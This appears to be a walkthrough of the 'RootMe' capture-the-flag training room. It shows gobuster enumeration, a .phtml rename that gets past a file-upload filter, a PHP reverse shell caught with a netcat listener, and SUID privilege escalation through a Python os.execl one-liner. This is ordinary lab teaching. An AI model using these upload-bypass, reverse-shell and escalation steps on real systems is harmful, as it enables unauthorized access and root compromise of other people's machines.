## Introduction

RootMe  is a beginner's training program to perform all the basic steps in an attack using a Linux computer as a target. The goal of this training is to gain root privileges and capture the flag > root.txt

This training program allows the player to practice their skills using many tools and techniques that can be found on Kali or THM AttackBox as well as resources on the Internet.

As we see from ```nmap``` scan <br>
There are 2 ports open : <br>
22/ssh — OpenSSH 7.6p1 <br>
80/http — Apache httpd 2.4.29

## Let’s open GoBuster!
I decided to use gobuster .
```
gobuster dir -u "http://<IP>" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```
<pre>
gobuster dir -u "http://10.10.53.147" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

```/panel```  was interesting as we can upload files here (open in browser).

## Getting a shell

```
http://<IP>/panel
```
I tried downloading the ```PHP reverse shell``` from PentestMonkey (download this file). <br>
[PHP reverse shell]( https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) 
<br> <br>
![phpfile](assets/RootMe-CTF/php_file.PNG)
<br><br>
But PHP files (files with the extension ".php") are not allowed. To get around this, we just have to <b> rename </b> the extension from ```.php``` to ```.phtml```. 
 <br>
 ![phpfile](assets/RootMe-CTF/php_file1.PNG)
<br> <br>
Before uploading, change the IP address in this file to the IP address of Tun0. To find the IP address of Tun0,   <B>Use The Command :<B>
```
ip addr | grep tun0 | grep inet
```
Copy your tun0 IP and paste in the file.
<pre>
$ip = '**.*.***.***';  // CHANGE THIS
</pre>
Now open a listening port on the port mentioned in $port in the reverse shell file. Remember to use the same port mentioned in the file. By default it is "1234". <br>
<B>Use The Command :<B>
```
nc -lvnp <PORT>
```
Now upload this file `.phtml`.
Yes!!! We have successfully uploaded our reverse shell. Now let's activate it by visiting `/uploads` in the browser as we have also seen this guide in gobuster.
```
http://<IP>/uploads
```
Now, we can see our file here, click on it.<br>
Check your terminal, it found <b> remote shell access </b>. <br> 
![netcat](assets/RootMe-CTF/nc.PNG)
I ran `ls -la` but did not found user flag. <br>
To find the `user.txt` i used the `find` command:
```
find / -type f -name user.txt 2> /dev/null
```
![user](assets/RootMe-CTF/user.PNG) <br> <br>
It is located in ```/var/www/user.txt```.  <br>
<b>Read it using: <b>
```
cat /var/www/user.txt
```

## Privilege Escalation
To look for the files with SUID permission we can  <b>use the command:<b>
```
find / -type f -user root -perm -4000 2>/dev/null
```
We have ```/usr/bin/python``` with SUID permission, and we're going to try to escalate our privileges. <br>
The first thing I need to do is go to [gtfobins](https://gtfobins.github.io/) to look for possible escalation commands to escalate privileges. <br>
![suid](assets/RootMe-CTF/suid.PNG)
Search for ```python``` in the search bar.
Since we have to exploit SUID, copy the command in the SUID section, but we don't need to use the entire command, just copy
```
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```
YES!! It indeed works. <br>
We have successfully escalate your privileges. <br> <br>
![whoami](assets/RootMe-CTF/whoami.PNG) <br> <br>
Let's start getting root knowledge. <br>
To find the ```root.txt``` run this command in the terminal :
```
find / -type f -name root.txt
```
<br>
![root](assets/RootMe-CTF/root.PNG)<br><br>
Now read the Root Flag by using: <br>
```
cat /root/root.txt
```
<br>
<B> CONGRATULATIONS!!! YOU HAVE COMPLETED THE ROOM!!! <B>
